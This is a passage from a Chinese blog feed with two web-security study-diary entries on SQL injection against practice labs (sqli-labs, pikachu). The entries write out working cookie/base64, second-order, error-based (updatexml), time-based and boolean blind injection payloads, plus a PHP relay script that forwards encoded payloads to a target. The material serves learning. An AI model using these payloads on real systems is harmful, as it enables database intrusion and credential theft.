      <link href="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/"/>
      <url>/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-二次-加解密-DNS等注入"><a href="#WEB漏洞-二次-加解密-DNS等注入" class="headerlink" title="WEB漏洞-二次,加解密,DNS等注入"></a><font size="6"><strong>WEB漏洞-二次,加解密,DNS等注入</strong></font></h2><span id="more"></span><h3 id="一、加解密注入"><a href="#一、加解密注入" class="headerlink" title="一、加解密注入"></a><font size="5"><strong>一、加解密注入</strong></font></h3><p>sqlilabs-less21-cookie&amp;加解密注入(实际案例)<br><img src="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/1.png"></p><p>抓取cookie数据包</p><pre class=" language-bash"><code class="language-bash">GET /Less-21/index.php HTTP/1.1Host: 10.1.1.133User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv:83.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,image/webp,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8Accept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,zh-TW<span class="token punctuation">;</span>q<span class="token operator">=</span>0.7,zh-HK<span class="token punctuation">;</span>q<span class="token operator">=</span>0.5,en-US<span class="token punctuation">;</span>q<span class="token operator">=</span>0.3,en<span class="token punctuation">;</span>q<span class="token operator">=</span>0.2Accept-Encoding: gzip, deflateReferer: http://10.1.1.133/Less-21/index.phpConnection: closeCookie: uname<span class="token operator">=</span>YWRtaW4%3DUpgrade-Insecure-Requests: 1</code></pre><p>YWRtaW4%3D这是一个base64加密的字符串其中%3D是编码中的&#x3D;符号，把他发送到编码模块当中解密,得到明文<br><img src="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/2.png"></p><p>发现这个是注入点需要将原来的注入方式重新加密发送给服务器。<br><img src="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/3.png"></p><p>也就是说admin’ and 1&#x3D;1加密之后的值是YWRtaW4nIGFuZCAxPTE&#x3D;<br><img src="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/4.png"></p><p>获取数据库名称admin’ or updatexml(1,concat(0x7e,(database())),0) or ‘加密后cookie值Cookie: uname&#x3D;YWRtaW4nIG9yIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChkYXRhYmFzZSgpKSksMCkgb3IgJwo&#x3D;<br><img src="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/5.png"><br><img src="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/6.png"></p><h3 id="二、二次注入"><a href="#二、二次注入" class="headerlink" title="二、二次注入"></a><font size="5"><strong>二、二次注入</strong></font></h3><p>二次注入一般是用于白盒测试、黑盒测试就算是找到注入也没办法攻击。<br><img src="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/7.png"></p><p>sqlilabs-less24-post登陆框&amp;二次注入<br><img src="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/8.png"></p><p>数据库中查询</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span><span class="token punctuation">;</span>+----+----------+------------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password   <span class="token operator">|</span>+----+----------+------------+<span class="token operator">|</span>  1 <span class="token operator">|</span> Dumb     <span class="token operator">|</span> Dumb       <span class="token operator">|</span><span class="token operator">|</span>  2 <span class="token operator">|</span> Angelina <span class="token operator">|</span> I-kill-you <span class="token operator">|</span><span class="token operator">|</span>  3 <span class="token operator">|</span> Dummy    <span class="token operator">|</span> p@ssword   <span class="token operator">|</span><span class="token operator">|</span>  4 <span class="token operator">|</span> secure   <span class="token operator">|</span> crappy     <span class="token operator">|</span><span class="token operator">|</span>  5 <span class="token operator">|</span> stupid   <span class="token operator">|</span> stupidity  <span class="token operator">|</span><span class="token operator">|</span>  6 <span class="token operator">|</span> superman <span class="token operator">|</span> genious    <span class="token operator">|</span><span class="token operator">|</span>  7 <span class="token operator">|</span> batman   <span class="token operator">|</span> mob<span class="token operator">!</span>le     <span class="token operator">|</span><span class="token operator">|</span>  8 <span class="token operator">|</span> admin    <span class="token operator">|</span> admin      <span class="token operator">|</span><span class="token operator">|</span>  9 <span class="token operator">|</span> admin1   <span class="token operator">|</span> admin1     <span class="token operator">|</span><span class="token operator">|</span> 10 <span class="token operator">|</span> admin2   <span class="token operator">|</span> admin2     <span class="token operator">|</span><span class="token operator">|</span> 11 <span class="token operator">|</span> admin3   <span class="token operator">|</span> admin3     <span class="token operator">|</span><span class="token operator">|</span> 12 <span class="token operator">|</span> dhakkan  <span class="token operator">|</span> dumbo      <span class="token operator">|</span><span class="token operator">|</span> 14 <span class="token operator">|</span> admin4   <span class="token operator">|</span> admin4     <span class="token operator">|</span><span class="token operator">|</span> 15 <span class="token operator">|</span> admin'<span class="token comment" spellcheck="true">#  | admin      |</span>+----+----------+------------+14 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span></code></pre><p>登录用户修改密码<br><img src="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/9.png"></p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span><span class="token punctuation">;</span>+----+----------+------------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password   <span class="token operator">|</span>+----+----------+------------+<span class="token operator">|</span>  1 <span class="token operator">|</span> Dumb     <span class="token operator">|</span> Dumb       <span class="token operator">|</span><span class="token operator">|</span>  2 <span class="token operator">|</span> Angelina <span class="token operator">|</span> I-kill-you <span class="token operator">|</span><span class="token operator">|</span>  3 <span class="token operator">|</span> Dummy    <span class="token operator">|</span> p@ssword   <span class="token operator">|</span><span class="token operator">|</span>  4 <span class="token operator">|</span> secure   <span class="token operator">|</span> crappy     <span class="token operator">|</span><span class="token operator">|</span>  5 <span class="token operator">|</span> stupid   <span class="token operator">|</span> stupidity  <span class="token operator">|</span><span class="token operator">|</span>  6 <span class="token operator">|</span> superman <span class="token operator">|</span> genious    <span class="token operator">|</span><span class="token operator">|</span>  7 <span class="token operator">|</span> batman   <span class="token operator">|</span> mob<span class="token operator">!</span>le     <span class="token operator">|</span><span class="token operator">|</span>  8 <span class="token operator">|</span> admin    <span class="token operator">|</span> 123456     <span class="token operator">|</span><span class="token operator">|</span>  9 <span class="token operator">|</span> admin1   <span class="token operator">|</span> admin1     <span class="token operator">|</span><span class="token operator">|</span> 10 <span class="token operator">|</span> admin2   <span class="token operator">|</span> admin2     <span class="token operator">|</span><span class="token operator">|</span> 11 <span class="token operator">|</span> admin3   <span class="token operator">|</span> admin3     <span class="token operator">|</span><span class="token operator">|</span> 12 <span class="token operator">|</span> dhakkan  <span class="token operator">|</span> dumbo      <span class="token operator">|</span><span class="token operator">|</span> 14 <span class="token operator">|</span> admin4   <span class="token operator">|</span> admin4     <span class="token operator">|</span><span class="token operator">|</span> 15 <span class="token operator">|</span> admin'<span class="token comment" spellcheck="true">#  | admin      |</span>+----+----------+------------+14 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span></code></pre><p>最后我们看到的是将admin的账户密码修改为了123456而admin’#并没有发生改变，原因是代码执行的过程中将’#没有过滤直接带入执行导致’与前面的代码闭合而#将后面的代码给注释。</p><h3 id="三、dnslog注入"><a href="#三、dnslog注入" class="headerlink" title="三、dnslog注入"></a><font size="5"><strong>三、dnslog注入</strong></font></h3><p>涉及资源：<a href="http://ceye.io/">http://ceye.io</a><br>参考资料：<a href="https://www.cnblogs.com/xhds/p/12322839.html">https://www.cnblogs.com/xhds/p/12322839.html</a><br>使用DnsLog盲注仅限于windos环境。</p><p>不知道啥子个情况dnslog在windows还是linux上就是没法运行缺少各种的库文件。所以先暂时放一段</p><h3 id="四、中转注入"><a href="#四、中转注入" class="headerlink" title="四、中转注入"></a><font size="5"><strong>四、中转注入</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$url</span><span class="token operator">=</span><span class="token string">'http://xxxx/job_bystjb/yjs_byszjs.asp?id='</span><span class="token punctuation">;</span><span class="token variable">$payload</span><span class="token operator">=</span>base64_encode<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$payload</span><span class="token punctuation">;</span><span class="token variable">$urls</span><span class="token operator">=</span><span class="token variable">$url</span><span class="token keyword">.</span><span class="token variable">$payload</span><span class="token punctuation">;</span>file_get_contents<span class="token punctuation">(</span><span class="token variable">$urls</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$urls</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-016</title>
      <link href="/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/"/>
      <url>/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-查询方式及报错盲注"><a href="#WEB漏洞-查询方式及报错盲注" class="headerlink" title="WEB漏洞-查询方式及报错盲注"></a><font size="6"><strong>WEB漏洞-查询方式及报错盲注</strong></font></h2><span id="more"></span><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a><font size="5"><strong>一、前言</strong></font></h3><p>前言：当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是SQL语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL语句大概写法也能更好的选择对应的注入语句。</p><h3 id="二、设计知识点"><a href="#二、设计知识点" class="headerlink" title="二、设计知识点"></a><font size="5"><strong>二、设计知识点</strong></font></h3><p>#补充:上课的Access暴力猜解不出的问题?</p><pre class=" language-bash"><code class="language-bash">Access扁移注入:解决列名获取不到的情况查看登陆框源代码的表单值或观察URL特征等也可以针对表或列获取不到的情况</code></pre><p>参考笔记：<a href="https://www.fujieace.com/penetration-test/access-offset-injection.html">https://www.fujieace.com/penetration-test/access-offset-injection.html</a></p><h4 id="1、SQL语句网站应用"><a href="#1、SQL语句网站应用" class="headerlink" title="1、SQL语句网站应用"></a><font size="4"><strong>1、SQL语句网站应用</strong></font></h4><pre class=" language-bash"><code class="language-bash">select查询数据在网站应用中进行数据显示查询操作例: <span class="token keyword">select</span> * from news where id<span class="token operator">=</span><span class="token variable">$id</span>insert插入数据在网站应用中进行用户注册添加等操作例: insert into news <span class="token punctuation">(</span>id, url,text<span class="token punctuation">)</span> values <span class="token punctuation">(</span> 2，<span class="token string">'x'</span>,<span class="token string">'<span class="token variable">$t</span>'</span><span class="token punctuation">)</span>delete删除数据后台管理里面删除文章删除用户等操作例: delete from news where id<span class="token operator">=</span><span class="token variable">$id</span>update更新数据会员或后台中心数据同步或缓存等操作例: update user <span class="token keyword">set</span> pwd<span class="token operator">=</span><span class="token string">'<span class="token variable">$p</span>'</span> where id<span class="token operator">=</span>2 and username<span class="token operator">=</span><span class="token string">' admin'</span>order by排序数据一般结合表名或列名进行数据排序操作例: <span class="token keyword">select</span> * from news order by <span class="token variable">$id</span>例: <span class="token keyword">select</span> <span class="token function">id</span> , name , price from news order by <span class="token variable">$order</span></code></pre><h3 id="三、SQL语句盲注"><a href="#三、SQL语句盲注" class="headerlink" title="三、SQL语句盲注"></a><font size="5"><strong>三、SQL语句盲注</strong></font></h3><p>盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类:</p><pre class=" language-bash"><code class="language-bash">1、基于布尔的sQL盲注-逻辑判断 regexp, like , ascii,left, ord , mid2、基于时间的sQL盲注-延时判断 <span class="token keyword">if</span> ,sleep3、基于报错的sQL盲注-报错回显 floor, updatexml, extractvalue </code></pre><p>参考地址：<a href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a>     <a href="https://developer.aliyun.com/article/692723">https://developer.aliyun.com/article/692723</a></p><p>首先了解下updatexml()函数1<br>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值<br>改变XML_document中符合XPATH_string的值<br>而我们的注入语句为：</p><pre class=" language-bash"><code class="language-bash">updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>SELECT @@version<span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span></code></pre><p>其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出</p><pre class=" language-bash"><code class="language-bash">ERROR 1105 <span class="token punctuation">(</span>HY000<span class="token punctuation">)</span>: XPATH syntax error: <span class="token string">':root@localhost'</span></code></pre><p>使用pikachu靶场进行测试，使用docker搭建pikachu靶场<br>docker run -d -p 8000:80 area39&#x2F;pikachu:latest</p><h4 id="1、insert语句"><a href="#1、insert语句" class="headerlink" title="1、insert语句"></a><font size="4"><strong>1、insert语句</strong></font></h4><p><img src="/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/1.png"></p><p>用burp抓取数据包、并修改数据包</p><pre class=" language-bash"><code class="language-bash"><span class="token string">'or updatexml(1,concat(0x7e,database(),0x7e),0) or'</span>username<span class="token operator">=</span>xiaodi<span class="token string">'or updatexml(1,concat(0x7e,version(),0x7e),0) or'</span><span class="token operator">&amp;</span>password<span class="token operator">=</span>123456<span class="token operator">&amp;</span>sex<span class="token operator">=</span>man<span class="token operator">&amp;</span>phonenum<span class="token operator">=</span>138<span class="token operator">&amp;</span>email<span class="token operator">=</span>%E5%9B%9B%E5%B7%9D<span class="token operator">&amp;</span>add<span class="token operator">=</span>%E6%88%90%E9%83%BD<span class="token operator">&amp;</span>submit<span class="token operator">=</span>submit</code></pre><p>注意：将注意语句放在语句的其他位置是可以的注意看网站提交的数据。<br><img src="/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/2.png"><br><img src="/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/3.png"><br><img src="/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/4.png"><br><img src="/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/5.png"></p><h4 id="2、update语句"><a href="#2、update语句" class="headerlink" title="2、update语句"></a><font size="4"><strong>2、update语句</strong></font></h4><p><img src="/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/6.png"><br>发送到repeter模块当中,修改数据包</p><pre class=" language-bash"><code class="language-bash"><span class="token string">'or updatexml(1,concat(0x7e,database(),0x7e),0) or'</span></code></pre><p><img src="/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/7.png"><br>原理基本一致</p><h4 id="3、delete语句"><a href="#3、delete语句" class="headerlink" title="3、delete语句"></a><font size="4"><strong>3、delete语句</strong></font></h4><pre class=" language-bash"><code class="language-bash">payload: 68 or updatexml <span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,datebase<span class="token punctuation">(</span><span class="token punctuation">))</span>,0<span class="token punctuation">)</span>且在BurpSuite中Ctrl+U 对payload进行url编码</code></pre><p><img src="/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/8.png"></p><h3 id="四、SQL时间盲注"><a href="#四、SQL时间盲注" class="headerlink" title="四、SQL时间盲注"></a><font size="5"><strong>四、SQL时间盲注</strong></font></h3><h4 id="1、sleep语句"><a href="#1、sleep语句" class="headerlink" title="1、sleep语句"></a><font size="4"><strong>1、sleep语句</strong></font></h4><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from member where id<span class="token operator">=</span>1<span class="token punctuation">;</span>+----+----------+----------------------------------+-------+----------+---------+--------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> pw                               <span class="token operator">|</span> sex   <span class="token operator">|</span> phonenum <span class="token operator">|</span> address <span class="token operator">|</span> email  <span class="token operator">|</span>+----+----------+----------------------------------+-------+----------+---------+--------+<span class="token operator">|</span>  1 <span class="token operator">|</span> vince    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span> admin <span class="token operator">|</span> asdasd   <span class="token operator">|</span> 四川    <span class="token operator">|</span> 成都   <span class="token operator">|</span>+----+----------+----------------------------------+-------+----------+---------+--------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span>mysql<span class="token operator">></span> <span class="token keyword">select</span> * from member where id<span class="token operator">=</span>1 and sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span><span class="token punctuation">;</span>Empty <span class="token keyword">set</span> <span class="token punctuation">(</span>5.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><h4 id="2、if语句"><a href="#2、if语句" class="headerlink" title="2、if语句"></a><font size="4"><strong>2、if语句</strong></font></h4><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> if<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'pikachu'</span>,123,456<span class="token punctuation">)</span><span class="token punctuation">;</span>+----------------------------------+<span class="token operator">|</span> if<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'pikachu'</span>,123,456<span class="token punctuation">)</span> <span class="token operator">|</span>+----------------------------------+<span class="token operator">|</span>                              123 <span class="token operator">|</span>+----------------------------------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> if<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'test'</span>,123,456<span class="token punctuation">)</span><span class="token punctuation">;</span>+-------------------------------+<span class="token operator">|</span> if<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'test'</span>,123,456<span class="token punctuation">)</span> <span class="token operator">|</span>+-------------------------------+<span class="token operator">|</span>                           456 <span class="token operator">|</span>+-------------------------------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><h4 id="3、if-sleep语句"><a href="#3、if-sleep语句" class="headerlink" title="3、if+sleep语句"></a><font size="4"><strong>3、if+sleep语句</strong></font></h4><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from member where id<span class="token operator">=</span>1 and sleep<span class="token punctuation">(</span>if<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'pikachu'</span>,5,0<span class="token punctuation">))</span><span class="token punctuation">;</span>Empty <span class="token keyword">set</span> <span class="token punctuation">(</span>5.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><p>语句的意思就是如果数据是pikachu就延迟5秒输出，不是的话就立即返回，但是在实际渗透过程中由于受到网络的影响时间注入不是很靠谱</p><pre class=" language-bash"><code class="language-bash">参考:like <span class="token string">'ros'</span><span class="token comment" spellcheck="true">#判断ro或ro...是否成立</span>regexp <span class="token string">'^xiaodi [a-z]'</span><span class="token comment" spellcheck="true">#匹配xiaodi及xiaodi...等if(条件,5,0)</span><span class="token function">sleep</span> <span class="token punctuation">(</span>5<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sQL语句延时执行s秒</span>mid <span class="token punctuation">(</span>a, b, c<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#从位置b开始，截取a字符串的c位</span>substr<span class="token punctuation">(</span> a,b, c<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#从b位置开始，截取字符串a的c长度</span>left <span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1<span class="token punctuation">)</span>, database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#left(a,b)从左侧截取a的前b位</span>length<span class="token punctuation">(</span>database <span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token operator">=</span>8<span class="token comment" spellcheck="true">#判断数据库database ()名的长度</span>ord<span class="token operator">=</span>ascii ascii<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">=</span>97 <span class="token comment" spellcheck="true">#判断x的ascii码是否等于97</span></code></pre><h4 id="4、if-mid-sleep"><a href="#4、if-mid-sleep" class="headerlink" title="4、if+mid+sleep"></a><font size="4"><strong>4、if+mid+sleep</strong></font></h4><p>判断数据库名称是不是以p开头如果是的话就延迟五秒输出。</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>+------------+<span class="token operator">|</span> database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">|</span>+------------+<span class="token operator">|</span> pikachu    <span class="token operator">|</span>+------------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where id<span class="token operator">=</span>1 and sleep<span class="token punctuation">(</span>if<span class="token punctuation">(</span>mid<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'p'</span>,5,0<span class="token punctuation">))</span><span class="token punctuation">;</span>Empty <span class="token keyword">set</span> <span class="token punctuation">(</span>5.00 sec<span class="token punctuation">)</span></code></pre><h3 id="五、布尔盲注"><a href="#五、布尔盲注" class="headerlink" title="五、布尔盲注"></a><font size="5"><strong>五、布尔盲注</strong></font></h3><pre class=" language-bash"><code class="language-bash">布尔（Boolean）型是计算机里的一种数据类型，只有True（真）和False（假）两个值。一般也称为逻辑型。 页面在执行sql语句后，只显示两种结果，这时可通过构造逻辑表达式的sql语句来判断数据的具体内容。12</code></pre><p>布尔注入用到的函数：</p><pre class=" language-bash"><code class="language-bash">mid<span class="token punctuation">(</span>str,start,length<span class="token punctuation">)</span>  :字符串截取ORD<span class="token punctuation">(</span><span class="token punctuation">)</span>                  :转换成ascii码Length<span class="token punctuation">(</span><span class="token punctuation">)</span>               :统计长度version<span class="token punctuation">(</span><span class="token punctuation">)</span>              :查看数据库版本database<span class="token punctuation">(</span><span class="token punctuation">)</span>             :查看当前数据库名user<span class="token punctuation">(</span><span class="token punctuation">)</span>                 :查看当前用户123456</code></pre><h4 id="布尔注入流程："><a href="#布尔注入流程：" class="headerlink" title="布尔注入流程："></a><font size="4"><strong>布尔注入流程：</strong></font></h4><p><strong>猜解获取数据库长度</strong></p><pre class=" language-bash"><code class="language-bash">' or length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span> <span class="token operator">></span> 8 --+    :符合条件返回正确，反之返回错误1</code></pre><p><strong>猜解数据库名</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token string">'or mid(database(),1,1)= '</span>z<span class="token string">' --+    :因为需要验证的字符太多，所以转化为ascii码验证'</span>or ORD<span class="token punctuation">(</span>mid<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span> <span class="token operator">></span> 100 --+ :通过确定ascii码，从而确定**数据库名**12</code></pre><p><strong>猜解表的总数</strong></p><pre class=" language-bash"><code class="language-bash">'or <span class="token punctuation">(</span>select count<span class="token punctuation">(</span>TABLE_NAME<span class="token punctuation">)</span> from information_schema.TABLES where TABLE_SCHEMA<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span> <span class="token operator">=</span> 2  --+   :判断表的总数1</code></pre><p><strong>猜解第一个表名的长度</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token string">'or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1) = 5 --+'</span>or <span class="token punctuation">(</span>select length<span class="token punctuation">(</span>TABLE_NAME<span class="token punctuation">)</span> from information_schema.TABLES where TABLE_SCHEMA<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> limit 1,1<span class="token punctuation">)</span> <span class="token operator">=</span> 5 --+ （第二个表）12</code></pre><p><strong>猜解第一个表名</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token string">'or mid((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit      0,1 ),1,1) = '</span>a<span class="token string">'  --+或者'</span>Or ORD<span class="token punctuation">(</span>mid<span class="token punctuation">(</span>select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA <span class="token operator">=</span> database<span class="token punctuation">(</span><span class="token punctuation">)</span> limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span> <span class="token operator">></span>100   --+1234</code></pre><p><strong>猜解表的字段的总数</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token string">'or (select count(column_name) from information_schema.COLUMNS where TABLE_NAME='</span>表名'<span class="token punctuation">)</span> <span class="token operator">></span> 5 --+1</code></pre><p><strong>猜解第一个字段的长度</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token string">'or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME='</span>表名<span class="token string">' limit 0,1) = 10 --+'</span>or <span class="token punctuation">(</span>select length<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.COLUMNS where TABLE_NAME<span class="token operator">=</span><span class="token string">'表名'</span> limit 1,1<span class="token punctuation">)</span> <span class="token operator">=</span> 10 --+ （第二个字段）12</code></pre><p><strong>猜解第一个字段名</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token string">'or mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = '</span>表名<span class="token string">' limit 0,1),1,1) = '</span>i<span class="token string">' --+或者'</span>or ORD<span class="token punctuation">(</span>mid<span class="token punctuation">((</span>select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME <span class="token operator">=</span> <span class="token string">'表名'</span> limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span> <span class="token operator">></span> 100 --+123</code></pre><p><strong>猜解直接猜测字段名</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token string">' or (select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='</span>表名<span class="token string">' limit 1,1) = '</span>username' --+1</code></pre><p><strong>猜解内容长度</strong></p><pre class=" language-bash"><code class="language-bash">假如已经知道字段名为  <span class="token function">id</span>   username password'or <span class="token punctuation">(</span>select Length<span class="token punctuation">(</span>concat<span class="token punctuation">(</span>username,<span class="token string">"---"</span>,password<span class="token punctuation">))</span> from admin limit 0,1<span class="token punctuation">)</span> <span class="token operator">=</span> 16  --+12</code></pre><p><strong>猜解内容</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token string">'or mid((select concat(username,"-----",password) from admin limit 0,1),1,1) = '</span>a<span class="token string">' --+或者'</span>or ORD<span class="token punctuation">(</span>mid<span class="token punctuation">((</span>select concat<span class="token punctuation">(</span>username,<span class="token string">"-----"</span>,password<span class="token punctuation">)</span> from admin limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span> <span class="token operator">></span> 100 --+    ASCII码猜解123</code></pre><p><strong>也可以直接猜测内容</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token string">'or (Select concat(username,"-----",password) from admin limit 0,1 ) = '</span>admin-----123456'   --+1</code></pre>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-015</title>
      <link href="/2023/09/28/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-015/"/>
      <url>/2023/09/28/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-015/</url>
      
